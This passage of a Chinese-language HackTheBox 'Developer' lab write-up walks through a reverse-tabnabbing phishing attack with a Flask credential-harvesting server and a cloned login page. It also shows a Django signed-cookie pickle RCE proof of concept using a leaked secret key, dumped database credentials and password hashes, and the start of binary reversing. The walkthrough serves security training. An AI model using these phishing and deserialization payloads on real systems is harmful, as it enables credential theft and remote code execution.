bytes.fromhex(hex_ct3)\n\n<span class=\"hljs-comment\"># 3. 根据推导，将三个密文全部异或</span>\n<span class=\"hljs-comment\"># flag = ct1 ^ ct2 ^ ct3</span>\n<span class=\"hljs-comment\"># 我们可以分两步来完成</span>\ntemp_xor_result = bxor(ct1, ct2)\nflag_bytes = bxor(temp_xor_result, ct3)\n\n<span class=\"hljs-comment\"># 4. 将恢复的字节数据解码为UTF-8字符串并打印</span>\ntry:\n    flag = flag_bytes.decode(<span class=\"hljs-string\">'utf-8'</span>)\n    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"🎉 Flag has been successfully recovered!\"</span>)\n    <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"[*] Flag: {flag}\"</span>)\nexcept UnicodeDecodeError:\n    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"❌ Could not decode the result as a UTF-8 string.\"</span>)\n    <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"[*] Raw bytes (hex): {flag_bytes.hex()}\"</span>)\n</code></pre>\n<pre><code class=\"hljs language-bash\">🎉 Flag has been successfully recovered!\n[*] Flag: DHTB{XorXorXorFunFunFun}\n</code></pre>\n<h2>钓鱼攻击</h2>\n<p>其实做完一道题就可以继续打了</p>\n<p>做完后有一个提交<code>writeup</code>的输入框</p>\n<p>我们开启<code>Web</code>服务器，并提交改地址上去，看是否有人会访问</p>\n<p>不一会就有回显了</p>\n<pre><code class=\"hljs language-bash\">➜  Developer python -m http.server 80\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n10.10.11.103 - - [21/Jun/2025 18:53:48] <span class=\"hljs-string\">\"GET / HTTP/1.1\"</span> 200 -\n10.10.11.103 - - [21/Jun/2025 18:53:49] code 404, message File not found\n10.10.11.103 - - [21/Jun/2025 18:53:49] <span class=\"hljs-string\">\"GET /favicon.ico HTTP/1.1\"</span> 404 -\n</code></pre>\n<p>但是我们还不知道要如何进行利用</p>\n<p><code>Sessionid</code>开启了<code>httponly</code> ，我们无法通过<code>XSS</code>获取</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image13.png\" alt=\"image.png\"></p>\n<p>通过目录扫描能发现，还存在一个登录框，并且是只能<code>admin</code>才能访问</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image14.png\" alt=\"image.png\"></p>\n<p>但是现在没什么用，回到后台，我发现当我们提交了<code>writeup</code>后，会在<code>profile</code>中生成一个链接</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image15.png\" alt=\"image.png\"></p>\n<p>重要的是这个链接具有<code>target</code>属性，其值为<code>_blank</code>,同时没有使用<code>rel=\"noopener\"</code>属性，这让我想起<code>Reverse_Tabnabbing</code> （标签页劫持攻击）漏洞，之前有在<code>Vulnhub</code>上的一台靶机（<a href=\"https://www.vulnhub.com/entry/napping-101,752/%EF%BC%89%E9%81%87%E5%88%B0%E8%BF%87\">https://www.vulnhub.com/entry/napping-101,752/）遇到过</a></p>\n<h3>Reverse_Tabnabbing</h3>\n<blockquote>\n<p><a href=\"https://owasp.org/www-community/attacks/Reverse_Tabnabbing\">https://owasp.org/www-community/attacks/Reverse_Tabnabbing</a></p>\n</blockquote>\n<p>监听一下对方请求</p>\n<pre><code class=\"hljs language-bash\">➜  Developer nc -lvp 80    \nlistening on [any] 80 ...\nconnect to [10.10.16.58] from developer.htb [10.10.11.103] 47222\nGET / HTTP/1.1\nHost: 10.10.16.58\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\nUpgrade-Insecure-Requests: 1\nIf-Modified-Since: Sat, 21 Jun 2025 11:08:45 GMT\n</code></pre>\n<p>回显中有<code>firefox</code>的<code>UA</code>，很大概率使用浏览器来访问的</p>\n<p>现在的思路是：提交跳转链接，然后伪造一个和<code>developer.htb</code> 的登录页面一样站点，对方点击后，弹到<code>writeup</code>页面，然后原始页面（<code>dashbroad</code>）变成我们的钓鱼网站，让对方以为登录掉了，然后我们获取凭证</p>\n<p>这里借用：<a href=\"https://0xdf.gitlab.io/2022/01/15/htb-developer.html#shell-as-www-data\">https://0xdf.gitlab.io/2022/01/15/htb-developer.html#shell-as-www-data</a> 的方法，我自己弄了好久没弄好</p>\n<p>搭建钓鱼服务器</p>\n<pre><code class=\"hljs language-bash\">➜  Developer <span class=\"hljs-built_in\">cat</span> server2.py  \nfrom flask import *\n\napp = Flask(__name__, template_folder=<span class=\"hljs-string\">'.'</span>)\n\n@app.route(<span class=\"hljs-string\">\"/writeup\"</span>)\ndef writeup():\n    <span class=\"hljs-built_in\">return</span> render_template(<span class=\"hljs-string\">'writeup.html'</span>)\n\n@app.route(<span class=\"hljs-string\">\"/accounts/login/\"</span>, methods=[<span class=\"hljs-string\">'GET'</span>, <span class=\"hljs-string\">'POST'</span>])\ndef login():\n\n    <span class=\"hljs-keyword\">if</span> request.method == <span class=\"hljs-string\">'POST'</span>:\n        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">'\\n'</span>.<span class=\"hljs-built_in\">join</span>([f<span class=\"hljs-string\">'{x[0]}: {x[1]}'</span> <span class=\"hljs-keyword\">for</span> x <span class=\"hljs-keyword\">in</span> request.form.items()]))\n        <span class=\"hljs-built_in\">return</span> redirect(<span class=\"hljs-string\">\"http://10.10.10.120/accounts/login/\"</span>, code=302)\n    <span class=\"hljs-keyword\">else</span>:\n        <span class=\"hljs-built_in\">return</span> render_template(<span class=\"hljs-string\">'login.html'</span>)\n\n<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:\n    app.run(host=<span class=\"hljs-string\">\"0.0.0.0\"</span>, port=80)\n</code></pre>\n<p>跳转网站</p>\n<pre><code class=\"hljs language-bash\">&#x3C;html>\n  &#x3C;body>\n    &#x3C;h2>Challenge Writeup&#x3C;/h2>\n    &#x3C;p>Something&#x3C;/p>\n    &#x3C;script>\n    <span class=\"hljs-keyword\">if</span> (window.opener) window.opener.parent.location.replace(<span class=\"hljs-string\">'http://10.10.16.58/accounts/login/'</span>);\n    <span class=\"hljs-keyword\">if</span> (window.parent != window) window.parent.location.replace(<span class=\"hljs-string\">'https://10.10.16.58/accounts/login/'</span>);           \n    &#x3C;/script>\n  &#x3C;/body>\n&#x3C;/html>\n</code></pre>\n<p>制造钓鱼站点</p>\n<pre><code class=\"hljs language-bash\">➜  Developer curl http://developer.htb/accounts/login/ > login.html                                                \n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100  1938  100  1938    0     0  13686      0 --:--:-- --:--:-- --:--:-- 13744\n</code></pre>\n<p>修改里面的静态内容为绝对路径并将<code>action</code> 改为<code>/accounts/login/</code></p>\n<pre><code class=\"hljs language-bash\">&#x3C;!doctype html>\n&#x3C;html lang=<span class=\"hljs-string\">\"en\"</span>>\n  &#x3C;<span class=\"hljs-built_in\">head</span>>\n    &#x3C;meta charset=<span class=\"hljs-string\">\"utf-8\"</span>>\n    &#x3C;meta name=<span class=\"hljs-string\">\"viewport\"</span> content=<span class=\"hljs-string\">\"width=device-width, initial-scale=1, shrink-to-fit=no\"</span>>\n    &#x3C;meta name=<span class=\"hljs-string\">\"description\"</span> content=<span class=\"hljs-string\">\"\"</span>>\n    &#x3C;meta name=<span class=\"hljs-string\">\"author\"</span> content=<span class=\"hljs-string\">\"\"</span>>\n    &#x3C;<span class=\"hljs-built_in\">link</span> rel=<span class=\"hljs-string\">\"icon\"</span> href=<span class=\"hljs-string\">\"http://developer.htb/img/favicon.ico\"</span>>\n    &#x3C;<span class=\"hljs-built_in\">link</span> rel=<span class=\"hljs-string\">\"stylesheet\"</span> href=<span class=\"hljs-string\">\"http://developer.htb/static/css/jquery.toasts.css\"</span>>\n    &#x3C;script src=<span class=\"hljs-string\">\"http://developer.htb/static/js/all.min.js\"</span>>&#x3C;/script>\n    &#x3C;script src=<span class=\"hljs-string\">\"http://developer.htb/static/js/jquery-3.2.1.min.js\"</span>>&#x3C;/script>\n    &#x3C;title>Login | Developer.HTB&#x3C;/title>\n\n    &#x3C;!-- Bootstrap core CSS -->\n    &#x3C;<span class=\"hljs-built_in\">link</span> rel=<span class=\"hljs-string\">\"stylesheet\"</span> href=<span class=\"hljs-string\">\"http://developer.htb/static/css/bootstrap.min.css\"</span>>\n\n    &#x3C;!-- Custom styles <span class=\"hljs-keyword\">for</span> this template -->\n    &#x3C;<span class=\"hljs-built_in\">link</span> href=<span class=\"hljs-string\">\"http://developer.htb/static/css/signin.css\"</span> rel=<span class=\"hljs-string\">\"stylesheet\"</span>>\n  &#x3C;/head>\n\n  &#x3C;body class=<span class=\"hljs-string\">\"text-center\"</span>>\n\n    &#x3C;form class=<span class=\"hljs-string\">\"form-signin\"</span> action=<span class=\"hljs-string\">\"/accounts/login/\"</span> method=<span class=\"hljs-string\">\"post\"</span>>\n        &#x3C;input <span class=\"hljs-built_in\">type</span>=<span class=\"hljs-string\">\"hidden\"</span> name=<span class=\"hljs-string\">\"csrfmiddlewaretoken\"</span> value=<span class=\"hljs-string\">\"3W4vCYZiDT8dEraVzrXiGZWKWIOnF1L89n59maXHD5msDXNkDs2N5ZV6TmEIQqFE\"</span>>\n      &#x3C;img class=<span class=\"hljs-string\">\"mb-4\"</span> src=<span class=\"hljs-string\">\"http://developer.htb/static/img/logo.png\"</span> alt=<span class=\"hljs-string\">\"\"</span> width=<span class=\"hljs-string\">\"72\"</span> height=<span class=\"hljs-string\">\"72\"</span>>\n      &#x3C;h1 class=<span class=\"hljs-string\">\"h3 mb-3 font-weight-normal\"</span>>Welcome back!&#x3C;/h1>\n      &#x3C;label <span class=\"hljs-keyword\">for</span>=<span class=\"hljs-string\">\"uname\"</span> class=<span class=\"hljs-string\">\"sr-only\"</span>>User Name&#x3C;/label>\n      &#x3C;input <span class=\"hljs-built_in\">type</span>=<span class=\"hljs-string\">\"text\"</span> <span class=\"hljs-built_in\">id</span>=<span class=\"hljs-string\">\"id_login\"</span> name=<span class=\"hljs-string\">\"login\"</span> placeholder=<span class=\"hljs-string\">\"Username\"</span> class=<span class=\"hljs-string\">\"form-control\"</span> required autofocus>\n      &#x3C;label <span class=\"hljs-keyword\">for</span>=<span class=\"hljs-string\">\"password\"</span> class=<span class=\"hljs-string\">\"sr-only\"</span>>Password&#x3C;/label>\n      &#x3C;input <span class=\"hljs-built_in\">type</span>=<span class=\"hljs-string\">\"password\"</span> <span class=\"hljs-built_in\">id</span>=<span class=\"hljs-string\">\"id_password\"</span> name=<span class=\"hljs-string\">\"password\"</span> placeholder=<span class=\"hljs-string\">\"Password\"</span> class=<span class=\"hljs-string\">\"form-control\"</span> required>\n\n      &#x3C;button <span class=\"hljs-built_in\">id</span>=<span class=\"hljs-string\">\"loginbtn\"</span> class=<span class=\"hljs-string\">\"btn btn-lg btn-primary btn-block\"</span> <span class=\"hljs-built_in\">type</span>=<span class=\"hljs-string\">\"submit\"</span>>Sign <span class=\"hljs-keyword\">in</span>&#x3C;/button>\n          &#x3C;a href=<span class=\"hljs-string\">\"http://developer.htb/saccounts/password/reset/\"</span> class=<span class=\"hljs-string\">\"auth-link\"</span>>Forgot password?&#x3C;/a>\n                &#x3C;div class=<span class=\"hljs-string\">\"text-center mt-4 font-weight-light\"</span>> Don<span class=\"hljs-string\">'t have an account? &#x3C;a href=\"http://developer.htb/saccounts/signup/\" >Click here!&#x3C;/a>\n      &#x3C;p class=\"mt-5 mb-3 text-muted\">&#x26;copy; Developer.HTB 2021&#x3C;/p>\n    &#x3C;/form>\n\n&#x3C;script src=\"http://developer.htb/static/js/jquery.toast.js\">&#x3C;/script>\n&#x3C;script>\n\n&#x3C;/script>\n  &#x3C;/body>\n&#x3C;/html>\n</span></code></pre>\n<p>开启钓鱼服务器，并提交<code>/writeup</code>到站点中，过一会就能接收到用户的密码了</p>\n<pre><code class=\"hljs language-bash\">➜  Developer python server2.py\n * Serving Flask app <span class=\"hljs-string\">'server2'</span>\n * Debug mode: off\nWARNING: This is a development server. Do not use it <span class=\"hljs-keyword\">in</span> a production deployment. Use a production WSGI server instead.\n * Running on all addresses (0.0.0.0)\n * Running on http://127.0.0.1:80\n * Running on http://192.168.111.155:80\nPress CTRL+C to quit\n10.10.11.103 - - [21/Jun/2025 20:49:24] <span class=\"hljs-string\">\"GET /writeup HTTP/1.1\"</span> 200 -\n10.10.11.103 - - [21/Jun/2025 20:49:24] <span class=\"hljs-string\">\"GET /accounts/login/ HTTP/1.1\"</span> 200 -\ncsrfmiddlewaretoken: 3W4vCYZiDT8dEraVzrXiGZWKWIOnF1L89n59maXHD5msDXNkDs2N5ZV6TmEIQqFE\nlogin: admin\npassword: SuperSecurePassword@HTB2021\n10.10.11.103 - - [21/Jun/2025 20:49:25] <span class=\"hljs-string\">\"POST /accounts/login/ HTTP/1.1\"</span> 302 -\n10.10.11.103 - - [21/Jun/2025 20:49:28] <span class=\"hljs-string\">\"GET /accounts/login/ HTTP/1.1\"</span> 200 -\n</code></pre>\n<p>这里很奇怪的就是，我自己复现该漏洞无法复现成功</p>\n<h2>Django Secret Key &#x26; RCE</h2>\n<p>拥有管理员凭据后，我们就能对 <code>/admin</code>进行登陆了</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image16.png\" alt=\"image.png\"></p>\n<p>能发现一个新的子域名</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image17.png\" alt=\"image.png\"></p>\n<p>搭建的是<code>sentry</code> 一款开源的实时异常监控平台</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image18.png\" alt=\"image.png\"></p>\n<p>注册账号登录进去，无法使用上面的凭据</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image19.png\" alt=\"image.png\"></p>\n<p>版本 <code>Sentry 8.0.0</code> 在网上能找到它的反序列化漏洞的利用脚本，但是并没有将<code>shell</code>弹回来</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image20.png\" alt=\"image.png\"></p>\n<p>这里使用 <code>jacob@developer.htb</code> （可以从<code>Member</code>里得到）的凭据和上边钓鱼得到的密码成功获得<code>sentry</code>更高权限</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image21.png\" alt=\"image.png\"></p>\n<p>然后摸索一番后，我创建了新的<code>project</code>然后删除，但是删除的时候出现了错误</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image22.png\" alt=\"image.png\"></p>\n<p>还有很多的调试信息</p>\n<pre><code class=\"hljs language-bash\">SENTRY_OPTIONS \t\n\n{<span class=\"hljs-string\">'cache.backend'</span>: <span class=\"hljs-string\">'sentry.cache.redis.RedisCache'</span>,\n <span class=\"hljs-string\">'cache.options'</span>: {},\n <span class=\"hljs-string\">'redis.options'</span>: {<span class=\"hljs-string\">'hosts'</span>: {0: {<span class=\"hljs-string\">'host'</span>: <span class=\"hljs-string\">'127.0.0.1'</span>,\n                                 <span class=\"hljs-string\">'password'</span>: <span class=\"hljs-string\">'g7dRAO6BjTXMtP3iXGJjrSkz2H9Zhm0CAp2BnXE8h92AOWsPZ2zvtAapzrP8sqPR92aWN9DA207XmUTe'</span>,\n                                 <span class=\"hljs-string\">'port'</span>: 6379}}},\n <span class=\"hljs-string\">'system.databases'</span>: {<span class=\"hljs-string\">'default'</span>: {<span class=\"hljs-string\">'ATOMIC_REQUESTS'</span>: False,\n                                  <span class=\"hljs-string\">'AUTOCOMMIT'</span>: True,\n                                  <span class=\"hljs-string\">'CONN_MAX_AGE'</span>: 0,\n                                  <span class=\"hljs-string\">'ENGINE'</span>: <span class=\"hljs-string\">'sentry.db.postgres'</span>,\n                                  <span class=\"hljs-string\">'HOST'</span>: <span class=\"hljs-string\">'localhost'</span>,\n                                  <span class=\"hljs-string\">'NAME'</span>: <span class=\"hljs-string\">'sentry'</span>,\n                                  <span class=\"hljs-string\">'OPTIONS'</span>: {},\n                                  <span class=\"hljs-string\">'PASSWORD'</span>: u<span class=\"hljs-string\">'********************'</span>,\n                                  <span class=\"hljs-string\">'PORT'</span>: <span class=\"hljs-string\">''</span>,\n                                  <span class=\"hljs-string\">'TEST_CHARSET'</span>: None,\n                                  <span class=\"hljs-string\">'TEST_COLLATION'</span>: None,\n                                  <span class=\"hljs-string\">'TEST_MIRROR'</span>: None,\n                                  <span class=\"hljs-string\">'TEST_NAME'</span>: None,\n                                  <span class=\"hljs-string\">'TIME_ZONE'</span>: <span class=\"hljs-string\">'UTC'</span>,\n                                  <span class=\"hljs-string\">'USER'</span>: <span class=\"hljs-string\">'sentry'</span>}},\n <span class=\"hljs-string\">'system.debug'</span>: True,\n <span class=\"hljs-string\">'system.secret-key'</span>: <span class=\"hljs-string\">'c7f3a64aa184b7cbb1a7cbe9cd544913'</span>}\n</code></pre>\n<p>可以看到内部装了<code>redis</code> ，并且密码也出来了，下边还有个有趣的<code>secret-key</code></p>\n<p>经过一番搜索，<code>secret-key</code> 会导致反序列化的<code>RCE</code>漏洞</p>\n<p>其中有一篇文章：<a href=\"https://blog.scrt.ch/2018/08/24/remote-code-execution-on-a-facebook-server/\">https://blog.scrt.ch/2018/08/24/remote-code-execution-on-a-facebook-server/</a></p>\n<p>里边有一个<code>POC</code> ，会让系统睡<code>30</code>秒</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-meta\">#!/usr/bin/python</span>\nimport django.core.signing, django.contrib.sessions.serializers\nfrom django.http import HttpResponse\nimport cPickle\nimport os\n\nSECRET_KEY=<span class=\"hljs-string\">'c7f3a64aa184b7cbb1a7cbe9cd544913'</span>\n<span class=\"hljs-comment\">#Initial cookie I had on sentry when trying to reset a password</span>\ncookie=<span class=\"hljs-string\">'.eJxrYKotZNQI5UxMLsksS80vSi9kimBjYGAoTs0rKaosZA5lKS5NyY_gAQplR7lVRJYEmrkUFqZFcAEFSlKLS5Lz87MzU8FayvOLslNTQnnjE0tLMuJLi1OL4jNTvFlDhZAEkhKTs1PzUkKVIObrlZZk5hTrgeT1XHMTM3McgSwniJpSPQABCTQf:1uSyim:otT7eddw7eu0o_QNAt1QRz6f1m8'</span>\nnewContent =  django.core.signing.loads(cookie,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt=<span class=\"hljs-string\">'django.contrib.sessions.backends.signed_cookies'</span>)\nclass PickleRce(object):\n    def __reduce__(self):\n        <span class=\"hljs-built_in\">return</span> (os.system,(<span class=\"hljs-string\">\"sleep 30\"</span>,))\nnewContent[<span class=\"hljs-string\">'testcookie'</span>] = PickleRce()\n\n<span class=\"hljs-built_in\">print</span> django.core.signing.dumps(newContent,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt=<span class=\"hljs-string\">'django.contrib.sessions.backends.signed_cookies'</span>,compress=True)\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Developer python2 POC.py     \n.eJxrYKotZNQI5UxMLsksS80vSo9gY2BgKE7NKymqDGUpLk3Jj-ABCmRHuVVElgSauRQWpkVwAQVKUotLkvPzszNTkwvyizMruIori0tSc7kKmUI5inNSUwsUjA0KmVsLWYIKWUOF4hNLSzLiS4tTi-KTEpOzU_NSQpUgduiVlmTmFOuB5PVccxMzcxyBLCeoGl4kfZkp3qylegB0jjs_:1uT0GX:UtsjlwEnnkwtUuqifJt-ZzyYO1s\n</code></pre>\n<p>事实证明，替换了<code>Cookie</code>后，确实加载了<code>30</code>秒</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image23.png\" alt=\"image.png\"></p>\n<p>我们尝试让其<code>curl</code>我们的服务器</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image24.png\" alt=\"image.png\"></p>\n<p>进行反弹<code>Shell</code></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image25.png\" alt=\"image.png\"></p>\n<h2>In www-data Shell</h2>\n<p>信息收集一波</p>\n<p>有两个用户</p>\n<pre><code class=\"hljs language-bash\">www-data@developer:/var/sentry$ <span class=\"hljs-built_in\">ls</span> /home\n<span class=\"hljs-built_in\">ls</span> /home\nkarl\nmark\n</code></pre>\n<p>数据配置文件可以在<code>/var/www/developer_ctf/developer_ctf/settings.py</code> 中找到</p>\n<pre><code class=\"hljs language-bash\">DATABASES = {                                            \n    <span class=\"hljs-string\">'default'</span>: {           \n        <span class=\"hljs-string\">'ENGINE'</span>: <span class=\"hljs-string\">'django.db.backends.postgresql'</span>,       \n        <span class=\"hljs-string\">'NAME'</span>: <span class=\"hljs-string\">'platform'</span>,             \n        <span class=\"hljs-string\">'USER'</span>: <span class=\"hljs-string\">'ctf_admin'</span>,  \n        <span class=\"hljs-string\">'PASSWORD'</span>: <span class=\"hljs-string\">'CTFOG2021'</span>,                         \n        <span class=\"hljs-string\">'HOST'</span>: <span class=\"hljs-string\">'localhost'</span>,   \n        <span class=\"hljs-string\">'PORT'</span>: <span class=\"hljs-string\">''</span>,    \n    }                                      \n}  \n</code></pre>\n<pre><code class=\"hljs language-bash\">www-data@developer:~/developer_ctf$ psql -U ctf_admin -h localhost -p 5432 -d platform\nPassword <span class=\"hljs-keyword\">for</span> user ctf_admin: \npsql (9.6.22)\nSSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)\nType <span class=\"hljs-string\">\"help\"</span> <span class=\"hljs-keyword\">for</span> <span class=\"hljs-built_in\">help</span>.\n\nplatform=> \n</code></pre>\n<p>获得用户似乎都无效</p>\n<pre><code class=\"hljs language-bash\"> <span class=\"hljs-built_in\">id</span> |                                         password                                         |          last_login           | is_superuser |                                                                        username                                                                        | first_name | last_name |          email           | is_staff | is_active |          date_joined          \n----+------------------------------------------------------------------------------------------+-------------------------------+--------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+------------+-----------+--------------------------+----------+-----------+-------------------------------\n  5 | pbkdf2_sha256$260000$FyKNWfAl4Z87o55I4bDST7<span class=\"hljs-variable\">$7PrVwU5N1687BSxClTP0tlnFg</span>+9VmOR6lsXiJsSRBNE= | 2021-05-27 20:15:00.346686+00 | f            | clubby789                                                                                                                                              |            |           | clubby789@developer.htb  | f        | t         | 2021-05-27 20:15:00.157993+00\n  2 | pbkdf2_sha256$260000$7Pu55SdoDNTu51RrtU5V8A<span class=\"hljs-variable\">$Fmn66ovbOqfNUKftQYrJcWmk7xzejU0g3F72jL</span>+cdUg= | 2021-05-23 22:25:03.654845+00 | f            | willwam845                                                                                                                                             |            |           | willwam845@developer.htb | f        | t         | 2021-05-23 22:25:03.474364+00\n  3 | pbkdf2_sha256$260000$k0RbpkHl5CvArYIwsGxFUb<span class=\"hljs-variable\">$ixe4YKYn45Fm8aq56GEzF8TUi9lydD2WA2gRxXz</span>/EMc= | 2021-05-25 12:23:52.298531+00 | f            | dmw0ng                                                                                                                                                 |            |           | dmw0ng@developer.htb     | f        | t         | 2021-05-25 12:23:52.090526+00\n  4 | pbkdf2_sha256$260000$aFEnXsRKf4YRRUw1qnlJSN<span class=\"hljs-variable\">$4oL</span>+FVJpqmi4sCt4U9ddPRE1srKZiP+HCXInnCuzdv0= | 2021-05-25 13:52:30.406816+00 | f            | jazzpizazz                                                                                                                                             |            |           | jazzpizazz@developer.htb | f        | t         | 2021-05-25 13:52:30.239297+00\n  8 | pbkdf2_sha256$260000$1ooBpoiFmfVEwYt6dsoXMi<span class=\"hljs-variable\">$fODy4UKt0vv0BllqLAJmSinmGBFffbezZrLptuyGpe4</span>= | 2025-06-21 11:35:29.667268+00 | f            | sunset                                                                                                                                                 |            |           | sunset@qq.com            | f        | t         | 2025-06-21 04:44:05.184883+00\n  9 | pbkdf2_sha256$260000$7fttI4Tuwlrd2wlnkScbDs<span class=\"hljs-variable\">$t9DwUfhd6jv8yiD7uih4HMgsKjrUg</span>/uCVR3RdujzBic= |                               | f            | 111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111 |            |           |                          | f        | t         | 2025-06-21 13:07:47.706432+00\n 10 | pbkdf2_sha256$260000$2tCPe0purzYSIKkdmorGpl<span class=\"hljs-variable\">$a4bFd9XH8FUfnZl</span>+mx/uAV3E1VxcjFJUOy8UAlbxL9Y= |                               | f            | 222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222 |            |           |                          | f        | t         | 2025-06-21 13:08:43.403158+00\n  1 | pbkdf2_sha256$260000$H7w2AZzBGAHHHvSzgQZXHf<span class=\"hljs-variable\">$TWkQdxmDHXDxoWLSEQYjZQbMJJjMpzmEHBqWMNHr0xc</span>= | 2025-06-21 13:16:19.266228+00 | t            | admin                                                                                                                                                  | Jacob      | Taylor    | admin@developer.ctf      | t        | t         | 2021-05-22 23:14:03+00\n</code></pre>\n<p>然后在<code>/etc/sentry/sentry.conf.py</code> 又能找到一个数据库凭据</p>\n<pre><code class=\"hljs language-bash\">    <span class=\"hljs-string\">'default'</span>: {\n        <span class=\"hljs-string\">'ENGINE'</span>: <span class=\"hljs-string\">'sentry.db.postgres'</span>,\n        <span class=\"hljs-string\">'NAME'</span>: <span class=\"hljs-string\">'sentry'</span>,                           \n        <span class=\"hljs-string\">'USER'</span>: <span class=\"hljs-string\">'sentry'</span>,\n        <span class=\"hljs-string\">'PASSWORD'</span>: <span class=\"hljs-string\">'SentryPassword2021'</span>,\n        <span class=\"hljs-string\">'HOST'</span>: <span class=\"hljs-string\">'localhost'</span>,\n        <span class=\"hljs-string\">'PORT'</span>: <span class=\"hljs-string\">''</span>,\n    }     \n}\n</code></pre>\n<p>这次能获得三个用户，并且<code>karl</code>是有家目录的</p>\n<pre><code class=\"hljs language-bash\">sentry=#   \n<span class=\"hljs-keyword\">select</span> <span class=\"hljs-built_in\">id</span>,username,password from auth_user;\n <span class=\"hljs-built_in\">id</span> |      username       |                                   password                                    \n----+---------------------+-------------------------------------------------------------------------------\n  1 | karl@developer.htb  | pbkdf2_sha256$12000$wP0L4ePlxSjD<span class=\"hljs-variable\">$TTeyAB7uJ9uQprnr</span>+mgRb8ZL8othIs32aGmqahx1rGI=\n  6 | sunset@qq.com       | pbkdf2_sha256$12000$0EZfh8zCtpXY<span class=\"hljs-variable\">$8aNutC5bwrU65AtpuvspwEicUw2</span>+63EQ61zjTyzVViE=\n  5 | jacob@developer.htb | pbkdf2_sha256$12000$MqrMlEjmKEQD<span class=\"hljs-variable\">$MeYgWqZffc6tBixWGwXX2NTf</span>/0jIG42ofI+W3vcUKts=\n(3 rows)\n</code></pre>\n<p>尝试破解密码</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image26.png\" alt=\"image.png\"></p>\n<p>得到密码：<code>insaneclownposse</code></p>\n<p>成功进入<code>Karl</code>用户<code>Shell</code>中，读取<code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\">karl@developer:~$ <span class=\"hljs-built_in\">cat</span> user.txt\n77cc1a399155edc9a66dae47df32a834\n</code></pre>\n<h2>In Karl Shell - To Root</h2>\n<p><code>sudo</code>权限</p>\n<pre><code class=\"hljs language-bash\">karl@developer:~$ <span class=\"hljs-built_in\">sudo</span> -l\n[<span class=\"hljs-built_in\">sudo</span>] password <span class=\"hljs-keyword\">for</span> karl: \nMatching Defaults entries <span class=\"hljs-keyword\">for</span> karl on developer:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser karl may run the following commands on developer:\n    (ALL : ALL) /root/.auth/authenticator\n</code></pre>\n<p>拉出来<code>IDA</code> ，<code>rust</code> 逆向<code>+1</code></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image27.png\" alt=\"image.png\"></p>\n<p><code>main</code>中还有个<code>authentication::main</code></p>\n<pre><code class=\"hljs language-bash\">int __fastcall main(int argc, const char **argv, const char **envp)\n{\n  isize v4; // rdx\n  core::ops::<span class=\"hljs-keyword\">function</span>::_Fn&#x3C;()> v5; // rdi\n  __int64 (__fastcall *v7)(); // [rsp+0h] [rbp-8h] BYREF\n\n  v4 = argc;\n  v7 = authentication::main::h453271f02403abaf;\n  v5.vtable = (usize (*)[3])&#x26;anon_b091e66417960b0266d335ff382118b4_0_llvm_10046553308101135558;\n  v5.pointer = (u8 *)&#x26;v7;\n  <span class=\"hljs-built_in\">return</span> std::rt::lang_start_internal::h3c710f42dc1fbba8(v5, v4, (u8 **)argv);\n}\n</code></pre>\n<p>进入到<code>authentication::main</code> ，前边两个<code>print</code>是打印前两条信息</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image28.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image29.png\" alt=\"image.png\"></p>\n<p>再下面就是加密的函数</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image30.png\" alt=\"image.png\"></p>\n<p><code>args.pieces.data_ptr = (_str *)crypto::aes::ctr::h2e946f13694abc7d(0LL, &#x26;v36, 16LL, &#x26;v37, 16LL);</code></p>\n<p>告诉我们使用<code>AES-CTR</code>进行加密，并且传入了从内存地址冲传入的两个常量<code>v36</code>和<code>v37</code> ，很有可能是<code>key</code>和<code>VI</code></p>\n<p>我们从<code>v36</code> 和 <code>v37</code>中将值复制出来</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image31.png\" 